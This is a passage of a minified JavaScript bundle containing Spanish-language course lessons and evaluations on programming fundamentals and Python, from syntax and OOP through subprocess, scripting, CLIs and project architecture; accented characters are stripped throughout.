Para cada escenario, elige la estructura de datos ms adecuada (Array, Pila, Cola, Mapa o Set) y justifica tu eleccin:
*   **Caso A:** Un sistema para gestionar el botn "Deshacer" (Undo) en un editor de texto.
*   **Caso B:** Almacenar una lista de 5,000 usuarios donde necesitamos buscar a uno especficamente por su DNI de forma instantnea.
*   **Caso C:** Un sistema de impresin donde los documentos deben imprimirse en el orden en que fueron enviados.

## 3. Optimizacin de Algoritmos
Tienes el siguiente problema: "Encontrar si dos listas de 10,000 nombres tienen algn nombre en comn".
*   **Enfoque 1:** Un bucle dentro de otro comparando todos contra todos.
*   **Enfoque 2:** Cargar la primera lista en un **Set** y luego recorrer la segunda lista verificando si el nombre existe en el Set.

**Pregunta:** Cul es la diferencia de performance estimada entre ambos y por qu el Enfoque 2 es superior para un Semi-Senior?

## 4. Descomposicin de Problemas
Describe la descomposicin (sub-problemas) para un sistema de **"Reserva de Asientos en un Cine"**. 
Menciona al menos 4 sub-procesos independientes que deben ocurrir para que la reserva sea exitosa y segura (evitando que dos personas reserven lo mismo).

## 5. Ejercicio Mental: Lgica de Negocio
Disea el algoritmo para un sistema de **"Descuento Progresivo"**:
*   Si compra 1 unidad: 0% descuento.
*   Si compra de 2 a 5 unidades: 10% descuento.
*   Si compra ms de 5 unidades: 20% descuento.
*   *Condicin especial:* Si el usuario es "VIP", se le suma un 5% extra al descuento final.

Escribe el pseudocdigo asegurndote de que los descuentos no se apliquen de forma errnea (ej. que no se sumen 10% + 20% si compra 6).

---

## Criterios de Aprobacin
*   **Razonamiento Estructural:** Elige las estructuras de datos correctas para los casos planteados.
*   **Conciencia de Performance:** Identifica y evita algoritmos de complejidad cuadrtica O(n).
*   **Modularidad:** Divide problemas grandes en piezas pequeas y manejables.

Demuestra tu nivel tcnico!   
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-senior",title:"Bases de la Programacin - Nivel Senior (Arquitectura)",level:"senior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Senior (Arquitectura)

Esta evaluacin mide la visin sistmica, la capacidad de evaluar trade-offs y la toma de decisiones arquitectnicas bajo escenarios de alta demanda o restricciones crticas.

---

## 1. Pensamiento Sistmico y Efectos Secundarios
Imagina un sistema de E-commerce donde, al realizar una venta, se dispara un proceso que actualiza el stock, enva un mail de confirmacin y genera una factura.
*   **Problema:** El servidor de correos est lento y tarda 10 segundos en responder.
*   **Anlisis Senior:** Cmo afecta este retraso a la experiencia de compra del usuario si el proceso es sncrono? Propn una solucin basada en **Pensamiento Sistmico** para desacoplar estos procesos.

## 2. Evaluacin de Trade-offs: El Dilema de la Consistencia
Debes disear un sistema de **"Contador de Likes"** para una celebridad con 100 millones de seguidores.
*   **Opcin A (Consistencia Fuerte):** Cada like actualiza la base de datos inmediatamente. El nmero es 100% exacto siempre.
*   **Opcin B (Consistencia Eventual):** Los likes se acumulan en memoria (cache) y se graban en la base de datos cada 5 minutos. El nmero puede tener un ligero retraso.

**Pregunta:** Cul elegiras para escalar a millones de usuarios simultneos y por qu? Justifica los riesgos de cada una.

## 3. Resolucin de Problemas Complejos: El "Vuelo Cancelado"
Disea la estrategia lgica para un sistema que debe reubicar a 300 pasajeros de un vuelo cancelado en otros vuelos disponibles de la misma aerolnea.
1.  Qu factores de **prioridad** tendras en cuenta? (Abstraccin).
2.  Cmo evitaras que el algoritmo entre en un bucle infinito buscando conexiones?
3.  Qu pasara si el sistema tarda 1 hora en calcular la solucin? Cmo lo optimizaras?

## 4. Gestin de Errores y Resiliencia
Define una estrategia de **"Circuit Breaker"** para un sistema que depende de una API externa (ej: un servicio de mapas). 
Cmo decidiras en qu momento "abrir el circuito" y dejar de llamar a la API externa para no saturar tu propio sistema?

## 5. Ejercicio Mental: Liderazgo y Deuda Tcnica
Un desarrollador Junior propone una solucin que funciona pero es O(n) y difcil de leer. El plazo de entrega es hoy mismo.
1.  Dejas que el cdigo pase a produccin para cumplir el plazo o lo frenas? 
2.  Cmo documentaras esta **Deuda Tcnica** si decides avanzar?
3.  Cmo explicaras al negocio el riesgo de no arreglarlo en el corto plazo?

---

## Criterios de Aprobacin Senior
*   **Visin de Negocio:** No busca la "mejor tcnica" sino la ms adecuada para el contexto.
*   **Resiliencia:** Sus soluciones contemplan fallos y estados de error.
*   **Escalabilidad:** Identifica cuellos de botella antes de que ocurran.
*   **Comunicacin:** Capacidad de justificar decisiones complejas de forma clara.

Felicidades por llegar aqu, Arquitecto!        
`,completed:!1,isProject:!0}]},uv={id:"python",title:"Python para Backend y Scripts",description:"Aprende el lenguaje ms verstil del mundo. Desde scripts de automatizacin hasta potentes servidores web.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"python-01-intro-python",title:"Python - El lenguaje que conquist el mundo",level:"junior",content:`# Leccin 01: Python - El lenguaje que conquist el mundo

**Python** es un lenguaje de programacin de alto nivel, interpretado y multiparadigma. Es conocido por su sintaxis clara y legible, que se asemeja al ingls.

## 1. Por qu Python?
*   **Legibilidad:** Menos lneas de cdigo para hacer lo mismo que en otros lenguajes.
*   **Versatilidad:** Se usa en Desarrollo Web (Django, Flask), Ciencia de Datos (Pandas, NumPy), Inteligencia Artificial (PyTorch, TensorFlow) y Automatizacin.
*   **Comunidad:** Millones de libreras listas para usar.

## 2. Sintaxis Bsica
En Python, los bloques de cdigo se definen por **Indentacin** (sangra), no por llaves \`{}\`.

Let's compare JS vs Python:

**JavaScript:**
\`\`\`javascript
if (x > 0) {
    console.log("Positivo");
}
\`\`\`

**Python:**
\`\`\`python
if x > 0:
    print("Positivo")
\`\`\`
Fjate que no hay punto y coma \`;\` al final de las lneas!

## 3. Tu primer programa
\`\`\`python
print("Hola Mundo desde Python")
# Esto es un comentario
\`\`\`

---

### Concepto Junior:
La indentacin en Python no es esttica, es **obligatoria**. Si mezclas espacios y tabs, o si indentas mal, el programa dar un \`IndentationError\` y no funcionar.
`,completed:!1},{id:"python-02-condicionales-variables",title:"Condicionales y Variables",level:"junior",content:'# Leccin 02: Condicionales y Variables\n\nEn Python no necesitas declarar el tipo de variable. Simplemente usas el nombre y el valor (`x = 5`). A esto se le llama **Tipado Dinmico**.\n\n## 1. Variables\n```python\nx = 5                # Entero (int)\ny = 3.14             # Flotante (float)\nnombre = "Juan"      # Cadena de texto (str)\nes_valido = True     # Booleano (bool) - Ojo: Mayscula en True/False!\nlista = [1, 2, 3]    # Lista (list)\n```\nNo existen `const` ni `let` ni `var`. Python asume la mejor opcin.\n\n## 2. Condicionales `if-elif-else`\nLa lgica principal es similar a otros lenguajes, pero con `:`.\n```python\nif edad >= 18:\n    print("Mayor de edad")\nelif edad >= 13:\n    print("Adolescente")\nelse:\n    print("Nio")\n```\n*   `if`: Si se cumple la condicin.\n*   `elif` (else if): Si no se cumpli la anterior, revisa esta.\n*   `else`: Si ninguna se cumpli.\n\n## 3. Operadores Lgicos\nEn JS usas `&&` y `||`. En Python usas `and`, `or` y `not`.\n```python\nif edad >= 18 and tiene_licencia:\n    print("Puede conducir")\n```\n\n---\n\n### Misin Junior:\nAcostmbrate a leer los mensajes de error de Python. Son muy claros: `SyntaxError: invalid syntax` suele ser que olvidaste los `:` o cerraste mal un parntesis.\n',completed:!1},{id:"python-03-loops-funciones",title:"Bucles y Funciones",level:"junior",content:'# Leccin 03: Bucles y Funciones\n\nEl corazn de la lgica de programacin en Python.\n\n## 1. Bucles `for` y `while`\n### Bucle `for`\nEn Python, el bucle `for` itera sobre secuencias u objetos iterables (como listas o strings).\n```python\nfrutas = ["manzana", "banana", "cereza"]\nfor fruta in frutas:\n    print(fruta)\n```\n\nSi quieres iterar un nmero fijo de veces, usas `range()`:\n```python\nfor i in range(5):\n    print(i) # Imprime 0, 1, 2, 3, 4\n```\n\n### Bucle `while`\nSe ejecuta mientras la condicin sea verdadera.\n```python\ncontador = 0\nwhile contador < 5:\n    print(contador)\n    contador += 1\n```\nOjo con los bucles infinitos! No existe `++` en Python, debes usar `+= 1`.\n\n## 2. Funciones (`def`)\nSe definen con la palabra clave `def`.\n```python\ndef saludar(nombre, edad=18):\n    return f"Hola {nombre}, tienes {edad} aos."\n\nmensaje = saludar("Ana", 25)\nprint(mensaje)\n```\n*   **f-strings:** `f"Texto {variable}"`. La forma moderna de interpolar variables (como las template literals de JS).\n*   **Parmetros por defecto:** Puedes definir valores predeterminados (`edad=18`).\n\n### Concepto Junior:\nEn Python, puedes devolver **mltiples valores** en una funcin.\n```python\ndef obtener_coords():\n    return 10, 20\n\nx, y = obtener_coords()\n```\nEsto es muy potente y evita tener que crear objetos solo para devolver dos datos simples.\n',completed:!1},{id:"python-04-estructuras-datos",title:"Estructuras de Datos - Listas, Tuplas y Diccionarios",level:"junior",content:`# Leccin 04: Estructuras de Datos - Listas, Tuplas y Diccionarios

Python destaca por sus estructuras de datos, que son muy potentes y fciles de usar.

## 1. Listas (\`list\`)
Son colecciones ordenadas y mutables de elementos. Soportan todos los tipos de dato (nmeros, strings, bool, etc.) y pueden mezclarse.
\`\`\`python
frutas = ["manzana", "banana", "cereza"]
frutas.append("naranja")  # Agregar al final
print(frutas[0])          # Acceder al primero
print(frutas[-1])         # Acceder al ltimo (Muy til!)
frutas.remove("banana")   # Eliminar por valor
\`\`\`

## 2. Tuplas (\`tuple\`)
Son colecciones ordenadas e inmutables (no puedes modificarlas). Ocupan menos memoria que las listas.
\`\`\`python
coordenadas = (10, 20)
# coordenadas[0] = 5  # Esto dara error: 'tuple' object does not support item assignment
\`\`\`
Se usan para datos que **no deberan cambiar** durante la ejecucin del programa, como configuraciones fijas o das de la semana.

## 3. Diccionarios (\`dict\`)
Son colecciones de pares Clave-Valor. Como los Objetos de JavaScript.
\`\`\`python
persona = {
    "nombre": "Ana",
    "edad": 25,
    "ciudad": "Madrid"
}
print(persona["nombre"])
persona["profesion"] = "Ingeniera" # Agregar nueva clave
\`\`\`

## 4. Sets (\`set\`)
Colecciones desordenadas de elementos nicos. tiles para **eliminar duplicados**.
\`\`\`python
numeros = [1, 2, 2, 3, 3, 3]
unicos = set(numeros) # {1, 2, 3}
\`\`\`

---

### Misin Junior:
Aprender la diferencia entre **Listas** (mutables) y **Tuplas** (inmutables). Si necesitas modificar los datos, usa una lista. Si son constantes, usa una tupla.
`,completed:!1},{id:"python-05-manejo-errores",title:"Manejo de Excepciones (`try-except`)",level:"junior",content:`# Leccin 05: Manejo de Excepciones (\`try-except\`)

Tu programa va a fallar. Lo importante no es evitar que falle, sino saber **recuperarse** del fallo.

## 1. Bloque \`try-except\`
En lugar de \`try-catch\` (JS), en Python usamos \`try-except\`.
\`\`\`python
try:
    numero = int(input("Introduce un nmero: "))
    resultado = 10 / numero
    print(resultado)
except ValueError:
    print("Ese no es un nmero vlido.")
except ZeroDivisionError:
    print("No puedes dividir por cero.")
except Exception as e:
    print(f"Ocurri un error inesperado: {e}")
finally:
    print("Esto se ejecuta siempre.")
\`\`\`

## 2. Lanzar Excepciones (\`raise\`)
Si detectas un error lgico en tu programa, puedes lanzar una excepcin manualmente.
\`\`\`python
def dividir(a, b):
    if b == 0:
        raise ValueError("El divisor no puede ser cero.")
    return a / b
\`\`\`

## 3. Context Managers (\`with\`)
Para manejar recursos externos (archivos, conexiones a BD) de forma segura.
\`\`\`python
with open("archivo.txt", "r") as f:
    contenido = f.read()
# Aqu el archivo se cierra automticamente, incluso si hubo error.
\`\`\`

---

### Concepto Junior:
Nunca uses un \`except:\` vaco a menos que sepas muy bien lo que haces. Ocultar todos los errorres hace imposible depurar (Debugging).
`,completed:!1},{id:"python-06-errores-comunes",title:"Errores Comunes de Principiante en Python",level:"junior",content:`# Leccin 06: Errores Comunes de Principiante en Python

Aprender de los errores de los dems te ahorrar horas de cabeza.

## 1. Modificar listas mientras las iteras
\`\`\`python
numeros = [1, 2, 3, 4]
for n in numeros:
    if n % 2 == 0:
        numeros.remove(n)  # MAL! Esto se salta elementos.
\`\`\`
**Solucin:** Itera sobre una copia \`for n in numeros[:]:\` o crea una nueva lista por comprensin.

## 2. Argumentos Mutables por Defecto
\`\`\`python
def agregar_item(item, lista=[]): # Peligro!
    lista.append(item)
    return lista

print(agregar_item(1)) # [1]
print(agregar_item(2)) # [1, 2] La lista se conserva entre llamadas!
\`\`\`
**Solucin:** Usa \`None\` como valor por defecto.
\`\`\`python
def agregar_item(item, lista=None):
    if lista is None:
        lista = []
    lista.append(item)
    return lista
\`\`\`

## 3. Ignorar PEP 8
Python tiene una gua de estilo oficial.
*   Usa \`snake_case\` para variables y funciones.
*   Usa \`CamelCase\` para clases.
*   Usa 4 espacios para la indentacin.
Ignorar esto hace que tu cdigo parezca amateur.

---

### Misin Junior:
Instala un linter (como \`flake8\` o \`pylint\`) en tu editor. Te avisar de estos errores antes de que ejecutes el cdigo.
`,completed:!1},{id:"python-07-practica-junior",title:"Prctica Python Junior: Scripting Real",level:"junior",content:`# Prctica Python Junior: Scripting Real

Acepta estos desafos para demostrar que dominas lo bsico.

---

## 1. El Analizador de Textos
**Consigna:** Crea un script que:
1.  Pida al usuario que escriba una frase.
2.  Cuente cuntas palabras tiene.
3.  Imprima las palabras en orden alfabtico.
4.  Diga cul es la palabra ms larga.
*Pista:* Usa \`input()\`, \`split()\`, \`len()\` y \`sort()\`.

## 2. El Filtrador de Emails
**Consigna:** Tienes una lista de strings con supuestos correos electrnicos:
\`\`\`python
emails = ["juan@gmail.com", "pedro", "maria@hotmail.com", "luis@"]
\`\`\`
Escribe una funcin que devuelva una nueva lista SOLO con los emails vlidos (que contengan "@" y al menos un punto "." despus del arroba).

## 3. La Calculadora con Memoria
**Consigna:** Crea una calculadora simple que:
1.  Pregunte dos nmeros.
2.  Pregunte la operacin (\`+\`, \`-\`, \`*\`, \`/\`).
3.  Guarde el resultado en una lista \`historial\`.
4.  Pregunte si quiere hacer otra operacin.
5.  Si dice que "no", imprima todo el historial de operaciones realizadas.
*Reto:* Maneja la divisin por cero con \`try-except\`.

---

### Resultado esperado:
Escribir cdigo Python limpio, usar estructuras de control correctamente y manejar errores bsicos.
`,completed:!1,isProject:!0},{id:"python-08-poo-clases",title:"Programacin Orientada a Objetos (POO)",level:"semi-senior",content:`# Leccin 08: Programacin Orientada a Objetos (POO)

Python es un lenguaje multiparadigma, pero todo en l es un objeto. Dominar las Clases es esencial para el nivel Semi-Senior.

## 1. Clases y Objetos
Una **Clase** es el plano (blueprint). Un **Objeto** es la casa construida usando ese plano.

\`\`\`python
class Perro:
    # El constructor (inicializador)
    def __init__(self, nombre, raza):
        self.nombre = nombre  # Atributo
        self.raza = raza

    # Un mtodo (funcin dentro de la clase)
    def ladrar(self):
        return f"{self.nombre} dice: Guau!"

# Instanciar el objeto
mi_perro = Perro("Firulais", "Labrador")
print(mi_perro.ladrar())
\`\`\`

## 2. El misterioso \`self\`
En Python, \`self\` es una referencia a la instancia actual. Es equivalente al \`this\` de Java o JavaScript, pero **debe pasarse explcitamente** como primer argumento en cada mtodo de instancia.

## 3. Encapsulamiento (Convencin)
Python no tiene \`private\` o \`protected\` estrictos como Java.
*   \`_variable\`: Un guion bajo indica "uso interno" (protected). Se puede acceder, pero no deberas.
*   \`__variable\`: Doble guion bajo activa el "Name Mangling", haciendo mucho ms difcil acceder desde fuera (private).

---

### Concepto Semi-Senior:
En Python, "We are all consenting adults". No se bloquea el acceso a variables privadas, se confa en que el programador respetar la convencin del guion bajo \`_\`.
`,completed:!1},{id:"python-09-herencia-polimorfismo",title:"Herencia y Polimorfismo",level:"semi-senior",content:`# Leccin 09: Herencia y Polimorfismo

Cuando construyes aplicaciones grandes, necesitas reutilizar cdigo y especializar comportamiento.

## 1. Herencia con \`super()\`
La palabra clave \`super()\` llama a la clase padre.
\`\`\`python
class Animal:
    def __init__(self, nombre):
        self.nombre = nombre

    def sonido(self):
        raise NotImplementedError("Subclase debe implementar esto")

class Gato(Animal):
    def __init__(self, nombre, edad):
        super().__init__(nombre)  # Llama al constructor de Animal
        self.edad = edad

    def sonido(self):
        return "Miau"
\`\`\`

## 2. Herencia Mltiple
Python permite que una clase herede de **mltiples** clases.
\`\`\`python
class Pato(Volador, Nadador):  # Cuidado con el MRO!
    pass
\`\`\`
*   **MRO (Method Resolution Order):** Es el algoritmo que usa Python para saber de qu clase padre hered el mtodo \`volar()\`.

## 3. Polimorfismo
El polimorfismo es la capacidad de tratar a objetos de diferentes clases de la misma manera.
*   Si \`Gato.sonido()\` y \`Perro.sonido()\` existen, puedes iterar una lista de animales y llamar a \`.sonido()\` sin importar la clase.

---

### Lo que hace un Semi-Senior:
Usa \`abc\` (Abstract Base Classes) para definir interfaces estrictas.
\`\`\`python
from abc import ABC, abstractmethod

class Forma(ABC):
    @abstractmethod
    def area(self): pass
\`\`\`
Si intentas instanciar \`Forma\`, Python lanzar un error. Obliga a las subclases a implementar \`area()\`.
`,completed:!1},{id:"python-10-modulos-paquetes",title:"Mdulos y Paquetes",level:"semi-senior",content:'# Leccin 10: Mdulos y Paquetes\n\nDivide y vencers. Un archivo Python es un mdulo. Una carpeta con archivos es un paquete.\n\n## 1. Importacin (`import`)\n```python\nimport math\nprint(math.pi)\n\nfrom math import sqrt\nprint(sqrt(16))  # 4.0\n```\n\n## 2. Paquetes: La estructura de carpetas\nUn **Paquete** es una carpeta que contiene un archivo especial llamado `__init__.py`.\n*   `__init__.py` le dice a Python: "Mrame, soy un paquete que se puede importar".\n\nEjemplo de estructura:\n`/mi_proyecto`\n  `/utils`\n    `__init__.py`  # Vaco o con imports internos\n    `fechas.py`\n    `logs.py`\n  `main.py`\n\nEn `main.py`:\n```python\nfrom utils.fechas import hoy\n```\n\n## 3. `if __name__ == "__main__":`\nEste bloque es crucial.\n```python\nif __name__ == "__main__":\n    print("Este cdigo solo se ejecuta si lanzas el script directamente")\n    # Si alguien hace import mi_script, NO se ejecuta este print\n```\nEs la forma de distinguir entre un "Programa" y una "Librera".\n\n---\n\n### Misin Semi-Senior:\nAprender la diferencia entre **Importacin Relativa** (`from . import algo`) y **Absoluta** (`from mi_proyecto.algo import algo`).\n',completed:!1},{id:"python-11-entornos-virtuales",title:"Entornos Virtuales y Gestor de Paquetes (pip)",level:"semi-senior",content:"# Leccin 11: Entornos Virtuales y Gestor de Paquetes (pip)\n\nPython tiene un problema: Si instalas una librera para el Proyecto A, afecta a todo el sistema. Si el Proyecto B necesita una versin antigua, se rompe. Solucin: Entornos Virtuales.\n\n## 1. El entorno virtual (`venv`)\nUn **Entorno Virtual** es una copia aislada de Python.\n```bash\npython -m venv .venv\n```\n*   Esto crea una carpeta `.venv` que contiene su propio ejecutable de Python y su propia carpeta de libreras `site-packages`.\n\n## 2. Activar el entorno\n*   **Linux/Mac:** `source .venv/bin/activate`\n*   **Windows:** `.venv\\Scripts\\activate`\n\n## 3. Gestor de paquetes (`pip`)\nCon el entorno activado, usa `pip install numpy`.\n\n## 4. `requirements.txt`\nEs el archivo donde listas las dependencias de tu proyecto.\n```python\n# Guardar las libreras actuales\npip freeze > requirements.txt\n\n# Instalar las libreras en un entorno nuevo\npip install -r requirements.txt\n```\n\n---\n\n### Misin Semi-Senior:\nNunca instales paquetes globales si puedes evitarlo. Aprende a usar `poetry` o `pipenv` si quieres ir ms all de los `requirements.txt`.\n",completed:!1},{id:"python-12-practica-semi-senior",title:"Prctica y Evaluacin: El Arquitecto Python",level:"semi-senior",content:'# Prctica y Evaluacin: El Arquitecto Python\n\nDemuestra que puedes estructurar cdigo limpio y modular.\n\n---\n\n## 1. Ejercicio Semi-Senior 1: El Sistema de Biblioteca\n**Consigna:** Modela una Biblioteca usando **POO**.\n*   Clase `Libro`: ttulo, autor, ao. Mtodo `__str__` para imprimirlo bonito.\n*   Clase `Biblioteca`: lista de libros. Mtodos `agregar_libro`, `buscar_libro`, `prestar_libro`.\n*   Un script `main.py` que importe estas clases desde un paquete `modelos/` e interacte con el usuario.\n\n## 2. Ejercicio Semi-Senior 2: Custom Exceptions\n**Escenario:** Tienes una funcin `procesar_pago(monto)`.\n*   Si el monto es negativo, lanza `MontoNegativoError`.\n*   Si el monto es 0, lanza `MontoCeroError`.\n*   Crea estas excepciones heredando de `Exception` y atrapalas en el bloque principal.\n\n## 3. Ejercicio Semi-Senior 3: Scripts Modulares\n**Consigna:** Crea un mdulo `utilidades.py` con funciones matemticas (factorial, fibonacci).\n*   En `main.py`, importa solo `factorial` usando `from ... import ...`.\n*   Asegrate de que `utilidades.py` tenga un bloque `if __name__ == "__main__":` para probar las funciones si se ejecutan directamente.\n\n---\n\n### Misin:\nUn programador Semi-Senior no solo escribe cdigo que funciona, escribe cdigo que otros pueden entender y modificar sin romper nada. \n',completed:!1,isProject:!0},{id:"python-13-buenas-practicas",title:"Buenas Prcticas (PEP 8 y Type Hints)",level:"semi-senior",content:`# Leccin 13: Buenas Prcticas (PEP 8 y Type Hints)

Escribir cdigo en Python es libre, pero hacerlo profesionalmente requiere disciplina.

## 1. La Gua de Estilo: PEP 8
Python tiene reglas claras.
*   **Indentacin:** 4 espacios (no tabs).
*   **Longitud de lnea:** Mximo 79 caracteres.
*   **Espacios:** Un espacio alrededor de operadores (\`a = b + c\`), pero no dentro de parntesis.
*   **Nombres:** \`snake_case\` para variables y funciones. \`CamelCase\` para Clases. \`UPPER_CASE\` para constantes.

## 2. Type Hinting (Tipado Esttico Opcional)
Desde Python 3.5, puedes (y debes) decir qu tipos espera tu funcin.
\`\`\`python
def saludar(nombre: str) -> str:
    return f"Hola {nombre}"
\`\`\`
Esto no hace que Python sea esttico (sigue siendo dinmico), pero ayuda muchsimo a los IDEs (VS Code) y Linters (\`mypy\`) a encontrar errores.

## 3. Docstrings
Documenta tus funciones.
\`\`\`python
def suma(a: int, b: int) -> int:
    """
    Calcula la suma de dos nmeros enteros.

    Args:
        a (int): Primer sumando.
        b (int): Segundo sumando.

    Returns:
        int: La suma de a y b.
    """
    return a + b
\`\`\`
Esto permite que al pasar el mouse sobre la funcin, veas la ayuda.

---

### Misin Semi-Senior:
Acostmbrate a escribir cdigo como si lo fueras a leer dentro de 6 meses. La claridad es reina.
`,completed:!1,isProject:!0},{id:"python-14-standard-lib-sys-os",title:"Standard Library (OS, Sys, Pathlib)",level:"semi-senior",content:'# Leccin 14: Standard Library (OS, Sys, Pathlib)\n\nPython viene con "pilas incluidas". La librera estndar es gigantesca y permite hacer casi cualquier cosa sin instalar nada externo.\n\n## 1. Interactuando con el sistema (`os` y `sys`)\n*   `sys.argv`: Permite leer los argumentos pasados por lnea de comandos.\n*   `sys.exit(1)`: Termina el programa indicando un error.\n*   `os.getenv("VAR")`: Lee variables de entorno.\n\n## 2. El moderno manejo de rutas (`pathlib`)\nAntes se usaba `os.path`. Hoy, un Semi-Senior usa `pathlib`.\n```python\nfrom pathlib import Path\n\n# Crear rutas agnsticas (funcionan en Windows y Linux)\nruta = Path("datos") / "usuarios" / "data.csv"\n\nif ruta.exists():\n    print(f"El archivo est en {ruta.resolve()}")\n    print(f"Nombre: {ruta.name}, Extensin: {ruta.suffix}")\n```\n\n## 3. Manejo de Fechas (`datetime`)\n```python\nfrom datetime import datetime, timedelta\n\nahora = datetime.now()\nmaana = ahora + timedelta(days=1)\n\nprint(ahora.strftime("%d/%m/%Y %H:%M")) # Formatear fecha\n```\n\n---\n\n### Misin Semi-Senior:\nDeja de concatenar rutas con strings (`"carpeta/" + archivo`). Eso rompe en Windows por las barras invertidas `\\`. Usa siempre `Pathlib`.\n',completed:!1},{id:"python-15-standard-lib-json-subprocess",title:"Standard Library (JSON, Subprocess)",level:"semi-senior",content:`# Leccin 15: Standard Library (JSON, Subprocess)

Maneja datos externos e interacta con otros comandos.

## 1. Mdulo \`json\`
Serializacin y deserializacin nativa.
\`\`\`python
import json

datos = {"nombre": "Juan", "edad": 20}
texto = json.dumps(datos, indent=4)  # De Dict a Str
nuevo_dict = json.loads(texto)       # De Str a Dict

# Directamente a archivo
with open("data.json", "w") as f:
    json.dump(datos, f)
\`\`\`

## 2. Ejecutar comandos del sistema (\`subprocess\`)
Ejecuta comandos de Bash/PowerShell desde Python.
\`\`\`python
import subprocess

try:
    # Captura la salida del comando "ls -l" o "dir"
    resultado = subprocess.run(["ls", "-l"], capture_output=True, text=True, check=True)
    print("Salida:", resultado.stdout)
except subprocess.CalledProcessError as e:
    print("El comando fall con cdigo:", e.returncode)
\`\`\`

## 3. Por qu \`subprocess\` en lugar de \`os.system\`?
\`os.system\` es inseguro y limitado. \`subprocess\` te permite:
*   Redirigir la entrada/salida estndar (Pipe).
*   Lanzar excepciones si el comando falla.
*   Evitar inyecciones de shell si usas la lista de argumentos \`["cmd", "arg"]\`.

---

### Misin Semi-Senior:
Automatiza tu trabajo. Usa Python para leer un archivo JSON, procesar sus datos y luego llamar a un comando de git o docker usando \`subprocess\`.
`,completed:!1},{id:"python-16-automatizacion-scripts",title:"Automatizacin de Tareas (Scripting)",level:"semi-senior",content:`# Leccin 16: Automatizacin de Tareas (Scripting)

Python es el sucesor espiritual de Bash para scripts complejos. Cuando un script de Bash supera las 50 lneas, es hora de pasarlo a Python.

## 1. Moviendo y renombrando archivos masivamente
Imagina que tienes una carpeta \`descargas\` llena de archivos y quieres organizarlos por extensin.
\`\`\`python
import shutil
from pathlib import Path

origen = Path("./descargas")
for archivo in origen.iterdir():
    if archivo.is_file():
        ext = archivo.suffix[1:] # quitar el punto
        carpeta_destino = origen / ext
        carpeta_destino.mkdir(exist_ok=True)
        shutil.move(str(archivo), str(carpeta_destino / archivo.name))
\`\`\`

## 2. Interactuando con Excel (CSV)
Muchas tareas de oficina implican leer un CSV, procesarlo y guardar otro.
\`\`\`python
import csv

with open("ventas.csv", "r") as f_in, open("resumen.csv", "w", newline="") as f_out:
    reader = csv.DictReader(f_in)
    writer = csv.DictWriter(f_out, fieldnames=["producto", "total"])
    writer.writeheader()

    for row in reader:
        total = int(row["cantidad"]) * float(row["precio"])
        writer.writerow({"producto": row["producto"], "total": total})
\`\`\`

## 3. Automatizacin de Web (Requests bsico)
\`\`\`python
import requests # pip install requests

resp = requests.get("https://api.clima.com/mendoza")
if resp.status_code == 200:
    temp = resp.json()["temperatura"]
    if temp > 30:
        print("Alerta de calor! Enciende el aire acondicionado.")
\`\`\`

---

### Misin de Automatizacin:
Identifica una tarea aburrida que hagas todos los das (borrar temporales, renombrar fotos, revisar precios) y escribe un script de Python que lo haga por ti.
`,completed:!1},{id:"python-17-cli-tools",title:"Creando CLIs (Command Line Interfaces)",level:"semi-senior",content:`# Leccin 17: Creando CLIs (Command Line Interfaces)

Quieres crear herramientas que se sientan profesionales como \`git\` o \`npm\`? Necesitas \`argparse\` o libreras modernas como \`Typer\`.

## 1. El mdulo \`argparse\` (Nativo)
\`\`\`python
import argparse

parser = argparse.ArgumentParser(description="Calculadora CLI")
parser.add_argument("x", type=int, help="El primer nmero")
parser.add_argument("y", type=int, help="El segundo nmero")
parser.add_argument("--sumar", action="store_true", help="Realizar suma")

args = parser.parse_args()

if args.sumar:
    print(f"La suma es: {args.x + args.y}")
\`\`\`
Ahora puedes ejecutar: \`python calculadora.py 5 10 --sumar\`.

## 2. Interactividad con \`input\` enriquecido
Para scripts interactivos que preguntan cosas al usuario.
\`\`\`python
nombre = input("Cmo te llamas? ")
edad = int(input("Edad? "))
\`\`\`

## 3. Barras de Progreso (Librera \`tqdm\`)
Si tu script tarda mucho, muestra feedback visual.
\`\`\`python
from tqdm import tqdm # pip install tqdm
import time

for _ in tqdm(range(100)):
    time.sleep(0.1) # Simulando trabajo pesado
\`\`\`

---

### Misin CLI:
Crea un script llamado \`todo.py\` que permita agregar tareas (\`todo.py add "Comprar pan"\`) y listar tareas (\`todo.py list\`). Guarda las tareas en un archivo JSON local.
`,completed:!1},{id:"python-18-arquitectura-proyectos",title:"Arquitectura de Proyectos Profesionales",level:"senior",content:`# Leccin 18: Arquitectura de Proyectos Profesionales

Escribir un script es fcil. Mantener un proyecto de 50,000 lneas requiere arquitectura.

## 1. Estructura de Proyecto (The Src Layout)
El estndar moderno para paquetes Python es poner el cdigo dentro de un directorio \`src\`.
\`\`\`
mi_proyecto/
 pyproject.toml      # Configuracin de dependencias y herramientas
 src/
    mi_paquete/
        __init__.py
        core/       # Lgica de negocio pura
        api/        # Endpoints o CLI
        db/         # Adaptadores de base de datos
 tests/              # Tests fuera del cdigo fuente
 README.md
\`\`\`
Esto evita problemas de importacin accidentales durante el desarrollo.

## 2. Gestin de Dependencias Moderna (\`Poetry\` vs \`Pip\`)
\`pip\` con \`requirements.txt\` es bsico. **Poetry** es el estndar moderno profesional.
*   Maneja dependencias y sub-dependencias.
*   Crea el virtualenv automticamente.
*   Empaqueta tu proyecto para subirlo a PyPI.

## 3. Principios de Diseo
Python es muy flexible, pero eso permite cdigo espagueti.
*   **Inyeccin de Dependencias:** No instancies clases de base de datos dentro de tu lgica de negocio. Psalas como argumentos.
*   **Capas:** Separa la lgica de dominio (Core) de la infraestructura (Flask, Django, SQL).

---

### Visin Senior:
"Un buen proyecto Python debe poder ser instalado con un solo comando (\`poetry install\`) y testeado con otro (\`pytest\`), sin configuraciones manuales oscuras".
`,completed:!1},{id:"python-19-tipado-avanzado",title:"Tipado Avanzado y Protocolos",level:"senior",content:`# Leccin 19: Tipado Avanzado y Protocolos

Ms all de \`str\` e \`int\`. El Tipado Avanzado en Python permite que el control esttico sea tan poderoso como en TypeScript o C#.

## 1. Union y Optional (\`Any\` es el enemigo)
\`Union[str, int]\` significa que una variable puede ser uno de dos tipos.
\`Optional[str]\` es igual a \`Union[str, None]\`.

## 2. Generics (\`TypeVar\`)
Cuando una funcin devuelve el mismo tipo que recibe, pero ese tipo puede variar.
\`\`\`python
from typing import TypeVar, List

T = TypeVar('T')

def invertir(lista: List[T]) -> List[T]:
    return lista[::-1]

